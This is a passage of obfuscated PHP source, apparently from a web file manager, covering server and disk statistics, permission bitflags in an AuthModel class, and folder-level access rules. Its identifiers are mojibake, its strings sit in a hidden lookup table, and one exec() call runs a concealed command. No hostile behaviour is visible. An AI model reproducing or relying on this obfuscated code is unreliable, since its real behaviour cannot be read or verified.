$Ãóå»•¿[536] => array($Ãóå»•¿[1931], $Ãóå»•¿[1932]), $Ãóå»•¿[1927] => array($Ãóå»•¿[1933], $Ãóå»•¿[1934], $Ãóå»•¿[1935]), $Ãóå»•¿[1928] => array($Ãóå»•¿[1936], $Ãóå»•¿[1937]), $Ãóå»•¿[1938] => array($Ãóå»•¿[1939], $Ãóå»•¿[1940], $Ãóå»•¿[1941])); $ä”©Õ“° = strtotime(date($Ãóå»•¿[1899])); $ â°çü¼ = array($Ãóå»•¿[244] => array($Ãóå»•¿[1080], $ä”©Õ“°)); if ($¼¡èªÀ) { $ â°çü¼[$Ãóå»•¿[43]] = array($Ãóå»•¿[17], $øµìåÑ[$¼¡èªÀ]); } $ìá¦¹ß” = Model($Ãóå»•¿[1902])->where($ â°çü¼)->count($·ÌŒèØ¬); return (int) $ìá¦¹ß”; } private function optionServer() { $É”ìíÍ£ =& $_SERVER[ü¢ÙÊñÛ]; $‰î‘Î¥˜ = $this->diskDriver(); $Ñä®»º¨ = KodIO::defaultDriver(); $ÚÀÄüœ¢ = array($É”ìíÍ£[883] => $Ñä®»º¨[$É”ìíÍ£[486]]); $³ëÌëÓÊ = Model($É”ìíÍ£[555])->where($ÚÀÄüœ¢)->sum($É”ìíÍ£[90]); $¼ï²Ÿ˜¬ = explode($É”ìíÍ£[63], $_SERVER[$É”ìíÍ£[158]]); $’í‘²úŠ = $¼ï²Ÿ˜¬[0]; $Ú–ç÷– = $GLOBALS[$É”ìíÍ£[16]][$É”ìíÍ£[31]]; $¦…î×¹ç = $Ú–ç÷–[$É”ìíÍ£[1042]]; if ($¦…î×¹ç == $É”ìíÍ£[1030]) { $©Ô®Üïç = explode($É”ìíÍ£[1357], $Ú–ç÷–[$É”ìíÍ£[1041]]); $¦…î×¹ç = $©Ô®Üïç[0]; } if ($¦…î×¹ç == $É”ìíÍ£[978] || $¦…î×¹ç == $É”ìíÍ£[870]) { $€µ°´ï‚ = Model()->db()->query($É”ìíÍ£[1942]); $®Ÿñ‚¾Ì = $€µ°´ï‚[0] && isset($€µ°´ï‚[0][$É”ìíÍ£[1646]]) ? $€µ°´ï‚[0][$É”ìíÍ£[1646]] : 0; $¦…î×¹ç = $É”ìíÍ£[1943] . ($®Ÿñ‚¾Ì ? $É”ìíÍ£[18] . $®Ÿñ‚¾Ì : $É”ìíÍ£[22]); } $ŒğÔø·Û = $GLOBALS[$É”ìíÍ£[16]][$É”ìíÍ£[436]][$É”ìíÍ£[892]]; return array($É”ìíÍ£[1944] => $‰î‘Î¥˜ ? $‰î‘Î¥˜[$É”ìíÍ£[1945]] : 0, $É”ìíÍ£[1946] => $‰î‘Î¥˜ ? $‰î‘Î¥˜[$É”ìíÍ£[1947]] : 0, $É”ìíÍ£[1948] => (int) $Ñä®»º¨[$É”ìíÍ£[1945]] * 1024 * 1024 * 1024, $É”ìíÍ£[1949] => (int) $³ëÌëÓÊ, $É”ìíÍ£[1950] => ucfirst($’í‘²úŠ), $É”ìíÍ£[1951] => $É”ìíÍ£[1952] . PHP_VERSION, $É”ìíÍ£[1953] => phpBuild64() ? 64 : 32, $É”ìíÍ£[822] => str_replace($É”ìíÍ£[1198], $É”ìíÍ£[1058], $¦…î×¹ç), $É”ìíÍ£[436] => ucfirst($ŒğÔø·Û), $É”ìíÍ£[42] => $_SERVER[$É”ìíÍ£[1954]]); } private function diskDriver() { $²·³ª™” =& $_SERVER[ü¢ÙÊñÛ]; $«éàô±İ = $²·³ª™”[18]; $Å²¿¶½í = $GLOBALS[$²·³ª™”[16]][$²·³ª™”[1374]] == $²·³ª™”[1375]; if ($Å²¿¶½í) { $«éàô±İ = $²·³ª™”[1955]; if (function_exists($²·³ª™”[1956])) { exec($²·³ª™”[1957], $àŸÖóæÀ); $«éàô±İ = $àŸÖóæÀ[1] . $²·³ª™”[18]; } } if (!file_exists($«éàô±İ)) { return; } if (!function_exists($²·³ª™”[1958])) { return; } $›ìÛÆØ = @disk_total_space($«éàô±İ); $Şà€’Õ = $›ìÛÆØ - @disk_free_space($«éàô±İ); return array($²·³ª™”[1945] => $›ìÛÆØ, $²·³ª™”[1947] => $Şà€’Õ); } public function fileChart($³Ñ¢Ñ…Ï) { $âò·å£ê =& $_SERVER[ü¢ÙÊñÛ]; if (isset($³Ñ¢Ñ…Ï[$âò·å£ê[1759]])) { return Model($âò·å£ê[890])->userFileTypeProfile($³Ñ¢Ñ…Ï[$âò·å£ê[1759]]); } if (isset($³Ñ¢Ñ…Ï[$âò·å£ê[1959]])) { return Model($âò·å£ê[890])->groupFileTypeProfile($³Ñ¢Ñ…Ï[$âò·å£ê[1959]]); } $°ÆÌ¶£ = $this->sourceSize(); $›òã¥äİ = array($âò·å£ê[203] => 0, $âò·å£ê[201] => 1); $ĞàĞçÎ¥ = Model($âò·å£ê[890])->where($›òã¥äİ)->sum($âò·å£ê[90]); $›òã¥äİ[$âò·å£ê[201]] = 2; $±Õ¿šó = Model($âò·å£ê[890])->where($›òã¥äİ)->sum($âò·å£ê[90]); return array($âò·å£ê[828] => $°ÆÌ¶£[$âò·å£ê[90]], $âò·å£ê[1892] => $°ÆÌ¶£[$âò·å£ê[1892]], $âò·å£ê[1893] => (int) $ĞàĞçÎ¥, $âò·å£ê[1894] => (int) $±Õ¿šó); } private function sourceSize() { $ÅûÀÚä =& $_SERVER[ü¢ÙÊñÛ]; $¬§ªŠô = Model($ÅûÀÚä[890])->where(array($ÅûÀÚä[496] => 0))->sum($ÅûÀÚä[90]); $˜Å¥ô£ = Model($ÅûÀÚä[555])->sum($ÅûÀÚä[90]); if ($˜Å¥ô£ > $¬§ªŠô) { $˜Å¥ô£ = $¬§ªŠô; } return array($ÅûÀÚä[90] => (int) $¬§ªŠô, $ÅûÀÚä[1892] => (int) $˜Å¥ô£); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Â²Š„Œ =& $_SERVER[ü¢ÙÊñÛ]; $¿é£¦À€ = array(array($Â²Š„Œ[505] => LNG($Â²Š„Œ[1960]), $Â²Š„Œ[1961] => $Â²Š„Œ[1962], $Â²Š„Œ[1963] => 1, $Â²Š„Œ[1964] => 1, $Â²Š„Œ[1965] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Â²Š„Œ[505] => LNG($Â²Š„Œ[1966]), $Â²Š„Œ[1961] => $Â²Š„Œ[1967], $Â²Š„Œ[1963] => 2, $Â²Š„Œ[1964] => 1, $Â²Š„Œ[1965] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Â²Š„Œ[505] => LNG($Â²Š„Œ[1968]), $Â²Š„Œ[1961] => $Â²Š„Œ[1969], $Â²Š„Œ[1963] => 3, $Â²Š„Œ[1964] => 1, $Â²Š„Œ[1965] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Â²Š„Œ[505] => LNG($Â²Š„Œ[1970]), $Â²Š„Œ[1961] => $Â²Š„Œ[1971], $Â²Š„Œ[1963] => 4, $Â²Š„Œ[1964] => 1, $Â²Š„Œ[1965] => self::AUTH_SHOW | self::AUTH_VIEW), array($Â²Š„Œ[505] => LNG($Â²Š„Œ[1972]), $Â²Š„Œ[1961] => $Â²Š„Œ[1973], $Â²Š„Œ[1963] => 5, $Â²Š„Œ[1964] => 1, $Â²Š„Œ[1965] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Â²Š„Œ[505] => LNG($Â²Š„Œ[1974]), $Â²Š„Œ[1961] => $Â²Š„Œ[1975], $Â²Š„Œ[1963] => 6, $Â²Š„Œ[1964] => 1, $Â²Š„Œ[1965] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Â²Š„Œ[505] => LNG($Â²Š„Œ[1976]), $Â²Š„Œ[1961] => $Â²Š„Œ[1977], $Â²Š„Œ[1963] => 7, $Â²Š„Œ[1964] => 1, $Â²Š„Œ[1965] => 0)); return $¿é£¦À€; } public static function authCheck($‘€¶Üóæ, $³ÛŞÂãæ) { $ñĞÇú×­ =& $_SERVER[ü¢ÙÊñÛ]; $‘€¶Üóæ = intval($‘€¶Üóæ); if (KodUser::isRoot() && $GLOBALS[$ñĞÇú×­[16]][$ñĞÇú×­[1978]]) { return !0; } if ($‘€¶Üóæ <= 0) { return !1; } if (($‘€¶Üóæ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($‘€¶Üóæ & $³ÛŞÂãæ); } public static function authCheckShow($½ğÊ’á¬) { return self::authCheck($½ğÊ’á¬, self::AUTH_SHOW); } public static function authCheckView($âùÊïØ—) { return self::authCheck($âùÊïØ—, self::AUTH_VIEW); } public static function authCheckDownload($òêÛ“šĞ) { return self::authCheck($òêÛ“šĞ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Šë§™ ç) { return self::authCheck($Šë§™ ç, self::AUTH_UPLOAD); } public static function authCheckEdit($›°¬×û) { return self::authCheck($›°¬×û, self::AUTH_EDIT); } public static function authCheckRemove($¤Ìëëƒ½) { return self::authCheck($¤Ìëëƒ½, self::AUTH_REMOVE); } public static function authCheckShare($•™³Áõ§) { return self::authCheck($•™³Áõ§, self::AUTH_SHARE); } public static function authCheckComment($ßßçéÕ¥) { return self::authCheck($ßßçéÕ¥, self::AUTH_COMMENT); } public static function authCheckEvent($ú¶”ä¢‚) { return self::authCheck($ú¶”ä¢‚, self::AUTH_EVENT); } public static function authCheckRoot($Îôõ€Ï³) { return self::authCheck($Îôõ€Ï³, self::AUTH_ROOT); } public static function authCheckAction($á‰“¿—, $Ğ”ò¥è­) { $ßŞ£ç“ƒ =& $_SERVER[ü¢ÙÊñÛ]; $é„êúÅº = array($ßŞ£ç“ƒ[1979] => self::AUTH_VIEW, $ßŞ£ç“ƒ[1268] => self::AUTH_DOWNLOAD, $ßŞ£ç“ƒ[121] => self::AUTH_UPLOAD, $ßŞ£ç“ƒ[1928] => self::AUTH_EDIT, $ßŞ£ç“ƒ[1927] => self::AUTH_REMOVE, $ßŞ£ç“ƒ[1938] => self::AUTH_SHARE, $ßŞ£ç“ƒ[441] => self::AUTH_COMMENT, $ßŞ£ç“ƒ[1746] => self::AUTH_EVENT, $ßŞ£ç“ƒ[1980] => self::AUTH_ROOT); if (!isset($é„êúÅº[$Ğ”ò¥è­])) { return; } $íü«éÁ = $é„êúÅº[$Ğ”ò¥è­]; $á‰“¿— = intval($á‰“¿—); if ($á‰“¿— <= 0) { return !1; } if (($á‰“¿— & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($á‰“¿— & $íü«éÁ); } public static function authDisable($İë£Ù™, $Ö‚ùÆ‹”) { if (intval($İë£Ù™) <= 0) { return 0; } return intval($İë£Ù™) & ~$Ö‚ùÆ‹”; } public $optionType = "\123\x79\163\164\x65\155\x2e\x73\157\x75\162\x63\145\101\165\164\x68\114\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\141\165\164\150", "\154\x61\x62\145\154", "\144\x69\163\160\x6c\141\x79", "\163\171\x73\x74\145\155", "\163\157\162\x74"); public function initData() { $ø¢¯í = $this->authDefault(); foreach ($ø¢¯í as $¹ÂÔà¶©) { $this->add($¹ÂÔà¶©); } } public function findAuth($õ·Ä„°¤, $€«£¾üß) { $¨‡ÅÇ÷Ğ =& $_SERVER[ü¢ÙÊñÛ]; $·˜Ğô® = parent::listData(); foreach ($·˜Ğô® as $Ôİşœ±Ü) { $²²¨Øˆ = intval($Ôİşœ±Ü[$¨‡ÅÇ÷Ğ[498]]); if ($²²¨Øˆ <= 0 || $Ôİşœ±Ü[$¨‡ÅÇ÷Ğ[1981]] == 0) { continue; } if (($²²¨Øˆ & $õ·Ä„°¤) != $õ·Ä„°¤) { continue; } if (($²²¨Øˆ & $€«£¾üß) != 0) { continue; } return $Ôİşœ±Ü[$¨‡ÅÇ÷Ğ[486]]; } return !1; } public function findAuthMax($Êˆ¤ëö², $²‘¼•û») { $¡Åğ =& $_SERVER[ü¢ÙÊñÛ]; $äÂóØĞ÷ = !1; $å˜¿¬ù = parent::listData(); foreach ($å˜¿¬ù as $è¥áªªĞ) { $€İ¥ƒÊÀ = intval($è¥áªªĞ[$¡Åğ[498]]); if ($€İ¥ƒÊÀ <= 0 || $è¥áªªĞ[$¡Åğ[1981]] == 0) { continue; } if (($€İ¥ƒÊÀ & $Êˆ¤ëö²) != $Êˆ¤ëö²) { continue; } if (($€İ¥ƒÊÀ & $²‘¼•û») != 0) { continue; } if (!$äÂóØĞ÷) { $äÂóØĞ÷ = $è¥áªªĞ; continue; } if (intval($äÂóØĞ÷[$¡Åğ[498]]) < $€İ¥ƒÊÀ) { $äÂóØĞ÷ = $è¥áªªĞ; } } return $äÂóØĞ÷ ? $äÂóØĞ÷[$¡Åğ[486]] : !1; } public function findAuthReadOnly() { $Óê‘õë = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÀôãÎµ‡ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Óê‘õë, $ÀôãÎµ‡); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $§Íç÷æµ =& $_SERVER[ü¢ÙÊñÛ]; $£¥ù‘Êî = parent::listData(); $†ïşÏÌş = !1; foreach ($£¥ù‘Êî as $ÊÎéêÎâ) { if ($ÊÎéêÎâ[$§Íç÷æµ[498]] <= 0 || $ÊÎéêÎâ[$§Íç÷æµ[1981]] == $§Íç÷æµ[241]) { continue; } if (!$†ïşÏÌş) { $†ïşÏÌş = $ÊÎéêÎâ; continue; } if ($†ïşÏÌş[$§Íç÷æµ[498]] > $ÊÎéêÎâ[$§Íç÷æµ[498]]) { $†ïşÏÌş = $ÊÎéêÎâ; } } return $†ïşÏÌş ? $†ïşÏÌş[$§Íç÷æµ[486]] : $§Íç÷æµ[22]; } public function listData($ƒ’à†…ä = false, $¥¹‰ÖËÎ = "\x73\157\162\164", $¥²³“š = false) { return parent::listData($ƒ’à†…ä, $¥¹‰ÖËÎ, $¥²³“š); } public function update($Øõ™öüß, $ÑÔäµ) { $ˆæâäÃ§ =& $_SERVER[ü¢ÙÊñÛ]; $¦Ò£ïî = parent::listData($Øõ™öüß); $§çĞ®¶Ì = $this->findByName($ÑÔäµ[$ˆæâäÃ§[42]]); if (!$¦Ò£ïî || $§çĞ®¶Ì && $§çĞ®¶Ì[$ˆæâäÃ§[486]] != $¦Ò£ïî[$ˆæâäÃ§[486]]) { return !1; } $this->filterAuth($ÑÔäµ[$ˆæâäÃ§[498]]); return parent::update($Øõ™öüß, $ÑÔäµ); } public function remove($”î®™öÁ) { $ò€çé›„ = parent::listData($”î®™öÁ); if (!$ò€çé›„ || $ò€çé›„[$_SERVER[ü¢ÙÊñÛ][202]]) { return !1; } return parent::remove($”î®™öÁ); } public function add($†Øúˆ§” = array()) { $Ãİˆ½”¨ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->findByName($†Øúˆ§”[$Ãİˆ½”¨[42]])) { return !1; } $¤½½½®À = array($Ãİˆ½”¨[42] => $Ãİˆ½”¨[22], $Ãİˆ½”¨[498] => 1, $Ãİˆ½”¨[1982] => $Ãİˆ½”¨[1969], $Ãİˆ½”¨[1981] => 1, $Ãİˆ½”¨[202] => 0, $Ãİˆ½”¨[1983] => 0); $†Øúˆ§” = array_merge($¤½½½®À, $†Øúˆ§”); $†Øúˆ§”[$Ãİˆ½”¨[1983]] = $this->getSort(); $this->filterAuth($†Øúˆ§”[$Ãİˆ½”¨[498]]); return parent::insert($†Øúˆ§”); } private function getSort() { $¡ª•áÓ’ =& $_SERVER[ü¢ÙÊñÛ]; $ûÚ–õù¬ = parent::listData(); $Ï±Á¼ëÓ = array_to_keyvalue($ûÚ–õù¬, $¡ª•áÓ’[22], $¡ª•áÓ’[1983]); return empty($Ï±Á¼ëÓ) ? 0 : max($Ï±Á¼ëÓ) + 1; } private function filterAuth(&$ÙîõÀã´) { if (!$ÙîõÀã´) { return; } $Ê’Áõ¬œ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ËªŸ¦´î = array(); foreach ($Ê’Áõ¬œ as $´×ÄÃïÕ) { if ($ÙîõÀã´ & $´×ÄÃïÕ) { $ËªŸ¦´î[] = $´×ÄÃïÕ; } } if (in_array(self::AUTH_ROOT, $ËªŸ¦´î)) { $ÙîõÀã´ = array_sum($Ê’Áõ¬œ); return; } $ô§Æó³ğ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ËªŸ¦´î as $´×ÄÃïÕ) { if (isset($ô§Æó³ğ[$´×ÄÃïÕ])) { $ËªŸ¦´î = array_merge($ËªŸ¦´î, $ô§Æó³ğ[$´×ÄÃïÕ]); } } $ËªŸ¦´î[] = self::AUTH_SHOW; $ÙîõÀã´ = array_sum(array_unique($ËªŸ¦´î)); } public function sort($æ••úÇ, $û“œ¼ıÀ) { return parent::update($æ••úÇ, $û“œ¼ıÀ); } } goto BèèèŠÚš; D¢³š‹¬ : class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\x63\145\x5f\x61\x75\164\x68"; public function getAuth($ÒÛ‹üü) { $é›ÈÄ¿ =& $_SERVER[ü¢ÙÊñÛ]; $Ãğïé®‹ = $this->sourceAuthSelect($ÒÛ‹üü); $äÜë× Ğ = array(); $üûíĞÒú = array(); $¢¯ü”Ú = 2 << 25; foreach ($Ãğïé®‹ as $“§üÇ­¸) { $®×¢øÕÈ = Model($é›ÈÄ¿[582])->listData($“§üÇ­¸[$é›ÈÄ¿[2067]]); if (!$®×¢øÕÈ) { continue; } $äÜë× Ğ[] = $“§üÇ­¸; $½ğÊÖ¯¹ = 0; if ($“§üÇ­¸[$é›ÈÄ¿[201]] == SourceModel::TYPE_GROUP) { $½ğÊÖ¯¹ = $¢¯ü”Ú * 2; } if ($“§üÇ­¸[$é›ÈÄ¿[201]] == SourceModel::TYPE_USER) { $½ğÊÖ¯¹ = $¢¯ü”Ú; } if ($“§üÇ­¸[$é›ÈÄ¿[201]] == SourceModel::TYPE_USER && $“§üÇ­¸[$é›ÈÄ¿[580]] == $é›ÈÄ¿[241]) { $½ğÊÖ¯¹ = 0; } $üûíĞÒú[] = $®×¢øÕÈ[$é›ÈÄ¿[498]] + $½ğÊÖ¯¹; } array_multisort($üûíĞÒú, SORT_DESC, $äÜë× Ğ); return $äÜë× Ğ; } public function sourceAuthSelect($¯Å‚ ¦) { $ÓÙö˜”¢ =& $_SERVER[ü¢ÙÊñÛ]; static $«õ ™íÒ = array(); $˜ÍÕõ’È = is_array($¯Å‚ ¦) ? !1 : !0; if ($˜ÍÕõ’È) { $¯Å‚ ¦ = array($¯Å‚ ¦); } $©×§˜Ä„ = array(); foreach ($¯Å‚ ¦ as $°÷‚÷¦„) { if (isset($«õ ™íÒ[$°÷‚÷¦„])) { $©×§˜Ä„[$°÷‚÷¦„] = $«õ ™íÒ[$°÷‚÷¦„]; } } if (count($©×§˜Ä„) == count($¯Å‚ ¦)) { return $˜ÍÕõ’È ? $©×§˜Ä„[$¯Å‚ ¦[0]] : $©×§˜Ä„; } $‹îå©à = $ÓÙö˜”¢[2145]; $ë§ş¼¿â = array($ÓÙö˜”¢[204] => array($ÓÙö˜”¢[17], $¯Å‚ ¦)); $´òµ¥Î = $this->field($‹îå©à)->order($ÓÙö˜”¢[486])->where($ë§ş¼¿â)->select(); $ÙİôÇ·Ø = array_to_keyvalue_group($´òµ¥Î, $ÓÙö˜”¢[204]); foreach ($¯Å‚ ¦ as $°÷‚÷¦„) { $«õ ™íÒ[$°÷‚÷¦„] = $ÙİôÇ·Ø[$°÷‚÷¦„] ? $ÙİôÇ·Ø[$°÷‚÷¦„] : array(); } if ($˜ÍÕõ’È) { return $´òµ¥Î; } return $ÙİôÇ·Ø; } public function setAuth($«™ãµğ˜, $ÓƒâÒĞ‚) { $øşŸ›îš =& $_SERVER[ü¢ÙÊñÛ]; $ç¥ñ‰¬ = Model($øşŸ›îš[1410])->sourceInfo($«™ãµğ˜); if (!$ç¥ñ‰¬) { return !1; } if ($ç¥ñ‰¬[$øşŸ›îš[201]] != SourceModel::TYPE_GROUP) { return !1; } $½‘·ô•Ÿ = 1; $âÚìî¥‹ = $ç¥ñ‰¬[$øşŸ›îš[580]]; if ($âÚìî¥‹ != $½‘·ô•Ÿ) { $‡™é™¢ = array($øşŸ›îš[1959] => $âÚìî¥‹); $æç¬«Ëé = Model($øşŸ›îš[2053])->field($øşŸ›îš[1759])->where($‡™é™¢)->select(); $æç¬«Ëé = array_to_keyvalue($æç¬«Ëé, $øşŸ›îš[22], $øşŸ›îš[1759]); } $Ô¼ºŸ¼€ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $à‚Å = array(); foreach ($ÓƒâÒĞ‚ as $ğàÈæãİ) { if (!in_array($ğàÈæãİ[$øşŸ›îš[201]], $Ô¼ºŸ¼€)) { show_json(LNG($øşŸ›îš[2146]), !1); } if ($âÚìî¥‹ != $½‘·ô•Ÿ) { if ($ğàÈæãİ[$øşŸ›îš[201]] == SourceModel::TYPE_GROUP) { } if ($ğàÈæãİ[$øşŸ›îš[580]] != 0 && !in_array($ğàÈæãİ[$øşŸ›îš[580]], $æç¬«Ëé)) { } } if ($ğàÈæãİ[$øşŸ›îš[580]] == 0) { $ğàÈæãİ[$øşŸ›îš[201]] = SourceModel::TYPE_USER; } $à‚Å[] = array($øşŸ›îš[204] => $«™ãµğ˜, $øşŸ›îš[201] => intval($ğàÈæãİ[$øşŸ›îš[201]]), $øşŸ›îš[580] => intval($ğàÈæãİ[$øşŸ›îš[580]]), $øşŸ›îš[2067] => intval($ğàÈæãİ[$øşŸ›îš[2067]]) ? intval($ğàÈæãİ[$øşŸ›îš[2067]]) : 0, $øşŸ›îš[2128] => intval($ğàÈæãİ[$øşŸ›îš[2128]]) ? intval($ğàÈæãİ[$øşŸ›îš[2128]]) : -1); } $this->where(array($øşŸ›îš[502] => $«™ãµğ˜))->delete(); $this->addAll($à‚Å); return !0; } public function authClear($³•³Àªˆ) { $Ÿîçå =& $_SERVER[ü¢ÙÊñÛ]; $íşç­İ = Model($Ÿîçå[1410])->sourceInfo($³•³Àªˆ); $ö´ëÔÈ = array($³•³Àªˆ); if ($íşç­İ[$Ÿîçå[496]] == $Ÿîçå[102]) { $¼‹ùĞù = array($Ÿîçå[666] => array($Ÿîçå[626], $íşç­İ[$Ÿîçå[595]] . $³•³Àªˆ . $Ÿîçå[627])); $ö´ëÔÈ = Model($Ÿîçå[1410])->field($Ÿîçå[502])->where($¼‹ùĞù)->getField($Ÿîçå[204], !0); $ö´ëÔÈ[] = $³•³Àªˆ; } $this->where(array($Ÿîçå[502] => array($Ÿîçå[503], $ö´ëÔÈ)))->delete(); return !0; } public function getAllChildren($ªô­ı ‡) { $‡…éºÇò =& $_SERVER[ü¢ÙÊñÛ]; $ª¿Ïš» = Model($‡…éºÇò[1410])->sourceInfo($ªô­ı ‡); if ($ª¿Ïš»[$‡…éºÇò[496]] != $‡…éºÇò[102]) { return $this->sourceListAuth(array($ªô­ı ‡)); } if ($ª¿Ïš»[$‡…éºÇò[201]] != SourceModel::TYPE_GROUP) { return array(); } $£í³Ğ¾Ğ = 1; $¥¦é¼ş™ = array($ªô­ı ‡); if ($ª¿Ïš»[$‡…éºÇò[203]] == $‡…éºÇò[241] && $ª¿Ïš»[$‡…éºÇò[580]] != $£í³Ğ¾Ğ) { $¥¦é¼ş™ = $this->groupChidldAllRootSource($ª¿Ïš»[$‡…éºÇò[580]]); } $ÓÔ‘¹œ = $this->field($‡…éºÇò[204])->group($‡…éºÇò[204])->select(); $ÓÔ‘¹œ = array_to_keyvalue($ÓÔ‘¹œ, $‡…éºÇò[22], $‡…éºÇò[204]); if (!$ÓÔ‘¹œ) { return array(); } $½ÊšİÆ = $‡…éºÇò[2147]; $Ò¿¥öµ = array($‡…éºÇò[204] => array($‡…éºÇò[17], $ÓÔ‘¹œ), $‡…éºÇò[516] => $‡…éºÇò[241]); $¾Ö¤˜ÂÎ = Model($‡…éºÇò[890])->field($½ÊšİÆ)->where($Ò¿¥öµ)->select(); $Ù¸‹ßùş = array($ªô­ı ‡); foreach ($¾Ö¤˜ÂÎ as $úœ½ãµ¶) { foreach ($¥¦é¼ş™ as $á¹Å‰Ÿ†) { $ŠÈ„•áá = $‡…éºÇò[60] . $á¹Å‰Ÿ† . $‡…éºÇò[60]; $Ï·¿õîğ = $úœ½ãµ¶[$‡…éºÇò[595]] . $úœ½ãµ¶[$‡…éºÇò[204]] . $‡…éºÇò[60]; if (strstr($Ï·¿õîğ, $ŠÈ„•áá)) { $Ù¸‹ßùş[] = $úœ½ãµ¶[$‡…éºÇò[204]]; break; } } } return $this->sourceListAuth($Ù¸‹ßùş); } private function sourceListAuth($·åÅƒ›•) { $¬Í“Á££ =& $_SERVER[ü¢ÙÊñÛ]; $ÇºÚ™¡ = Model($¬Í“Á££[1410])->sourceListInfo($·åÅƒ›•, !0); $‘®«äñ = $this->sourceAuthSelect($·åÅƒ›•); $¬ßûü¦ = array(); $µÁÃû²… = array(); foreach ($ÇºÚ™¡ as $ÜŠ¹§õ‹) { unset($ÜŠ¹§õ‹[$¬Í“Á££[540]]); unset($ÜŠ¹§õ‹[$¬Í“Á££[538]]); unset($ÜŠ¹§õ‹[$¬Í“Á££[498]]); unset($ÜŠ¹§õ‹[$¬Í“Á££[101]]); $©ÖÌµø = $‘®«äñ[$ÜŠ¹§õ‹[$¬Í“Á££[204]]]; if (!$©ÖÌµø) { continue; } $ÜŠ¹§õ‹[$¬Í“Á££[2148]] = $this->authTargetInfo($©ÖÌµø); $ÜŠ¹§õ‹[$¬Í“Á££[593]] = rtrim($ÜŠ¹§õ‹[$¬Í“Á££[599]], $¬Í“Á££[18]) . $¬Í“Á££[18] . ltrim($ÜŠ¹§õ‹[$¬Í“Á££[593]], $¬Í“Á££[18]); $¬ßûü¦[] = $ÜŠ¹§õ‹; $‚‚Ÿìè = count(explode($¬Í“Á££[18], trim($ÜŠ¹§õ‹[$¬Í“Á££[593]], $¬Í“Á££[18]))); $µÁÃû²…[] = $‚‚Ÿìè + ($ÜŠ¹§õ‹[$¬Í“Á££[43]] == $¬Í“Á££[89] ? 0 : 1000); } array_multisort($µÁÃû²…, SORT_ASC, $¬ßûü¦); return $¬ßûü¦; } private function groupChidldAllRootSource($Ä®Áı‘¡) { $Ş»³‡Ë  =& $_SERVER[ü¢ÙÊñÛ]; $ä€ÛÌøÁ = Model($Ş»³‡Ë [2149])->groupChildrenAll($Ä®Áı‘¡); $‘ Ùù— = array($Ş»³‡Ë [203] => 0, $Ş»³‡Ë [580] => array($Ş»³‡Ë [17], $ä€ÛÌøÁ), $Ş»³‡Ë [201] => SourceModel::TYPE_GROUP); $ş¥ìéµÅ = Model($Ş»³‡Ë [890])->field($Ş»³‡Ë [204])->where($‘ Ùù—)->select(); $ş¥ìéµÅ = array_to_keyvalue($ş¥ìéµÅ, $Ş»³‡Ë [22], $Ş»³‡Ë [204]); return $ş¥ìéµÅ; } private function authTargetInfo($‡è…Šõ) { $Í¿‡Ï =& $_SERVER[ü¢ÙÊñÛ]; $“û’±¾ú = array(); $ó¦»¤Ï = array(); $—ñÃÃíí = 2 << 25; foreach ($‡è…Šõ as $È¦ÜĞĞ’) { $ÖõçÄÎ = Model($Í¿‡Ï[582])->listData($È¦ÜĞĞ’[$Í¿‡Ï[2067]]); if (!$ÖõçÄÎ) { continue; } if ($È¦ÜĞĞ’[$Í¿‡Ï[201]] == SourceModel::TYPE_USER) { $Ó¢¬Öô = Model($Í¿‡Ï[588])->getInfoSimpleOuter($È¦ÜĞĞ’[$Í¿‡Ï[580]]); if ($Ó¢¬Öô[$Í¿‡Ï[1759]] == $Í¿‡Ï[1262]) { continue; } if ($Ó¢¬Öô[$Í¿‡Ï[1759]] == $Í¿‡Ï[241]) { $Ó¢¬Öô[$Í¿‡Ï[42]] = LNG($Í¿‡Ï[2150]); } } else { $Ó¢¬Öô = Model($Í¿‡Ï[596])->getInfoSimple($È¦ÜĞĞ’[$Í¿‡Ï[580]]); } if (!$Ó¢¬Öô) { continue; } 